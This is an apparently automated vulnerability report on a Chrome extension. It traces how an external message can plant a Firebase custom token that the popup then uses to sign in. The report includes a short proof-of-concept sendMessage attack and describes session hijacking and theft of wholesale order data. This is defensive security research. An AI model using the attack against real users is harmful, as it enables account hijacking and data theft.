# CoCo Analysis: bafnlabfjcbfnaakjobokdknlhldmlnj

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bafnlabfjcbfnaakjobokdknlhldmlnj/opgen_generated_files/bg.js
Line 976: chrome.storage.local.set({ customToken: request.token });

**Code:**

```javascript
// Background script (background.js) - Lines 3-15
chrome.runtime.onMessageExternal.addListener(
  (request, sender) => {
    const allowedOrigins = [
      "https://faves-web-dev.web.app",
      "https://faves-pro-uploader.web.app",
      "https://uploader.favespro.com"
    ]

    if (allowedOrigins.includes(sender.origin)) {
      chrome.storage.local.set({ customToken: request.token }); // ← Store attacker token
    }
  }
);

// Popup UI (static/js/main.28d1744a.chunk.js decompiled from source map)
// Extension popup reads the poisoned token and uses it for Firebase authentication
auth.onAuthStateChanged(async (user, error) => {
  setIsLoading(true);

  if (error) {
    Sentry.captureException(error);
  }

  // Read attacker-controlled token from storage
  const token = await chrome.storage?.local.get("customToken").then((result) => result.customToken);
  await chrome.storage?.local.remove("customToken");

  if (user) {
    setIsLoggedIn(true);
    setIsLoading(false);
  } else {
    setIsLoggedIn(false);

    if (token) {
      await loginWithCustomToken(token); // ← Authenticate with attacker's token
    }

    setIsLoading(false);
  }
});

// firebase.js - loginWithCustomToken implementation
export function loginWithCustomToken(token) {
  return signInWithCustomToken(auth, token); // ← Firebase authentication with attacker token
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Attacker website (must be in externally_connectable whitelist: faves-web-dev.web.app,
// faves-pro-uploader.web.app, or uploader.favespro.com)
// Per methodology Rule 1: Ignore manifest restrictions - if even ONE domain can exploit, it's TP

// Attacker generates a malicious Firebase custom token for their own Firebase account
const maliciousToken = "attacker-controlled-firebase-custom-token";

chrome.runtime.sendMessage(
  'bafnlabfjcbfnaakjobokdknlhldmlnj', // Extension ID
  {
    token: maliciousToken
  }
);

// Flow:
// 1. Background script stores attacker's token in chrome.storage.local
// 2. When user opens extension popup, it reads the poisoned token
// 3. Extension calls signInWithCustomToken(auth, attackerToken)
// 4. User is now authenticated to Firebase as attacker's account
// 5. Extension sends user's order data to attacker's Firebase storage
// 6. Attacker receives victim's sensitive wholesale order information
```

**Impact:** Authentication hijacking vulnerability. An attacker controlling a whitelisted domain can inject a malicious Firebase custom authentication token into the extension's storage. When the user opens the extension popup, the extension authenticates to Firebase using the attacker's token instead of the legitimate user's credentials. This allows the attacker to:

1. Hijack the user's session and authenticate them to the attacker's Firebase account
2. Redirect sensitive wholesale order data (page HTML, order details, store information) to attacker-controlled Firebase storage instead of the legitimate FAVES Pro backend
3. Exfiltrate confidential business information including product catalogs, pricing, customer orders, and wholesale platform credentials
4. Persist the attack across browser sessions until the user manually logs out

The vulnerability enables complete compromise of the extension's data flow, allowing attackers to intercept and steal all uploaded wholesale order information.
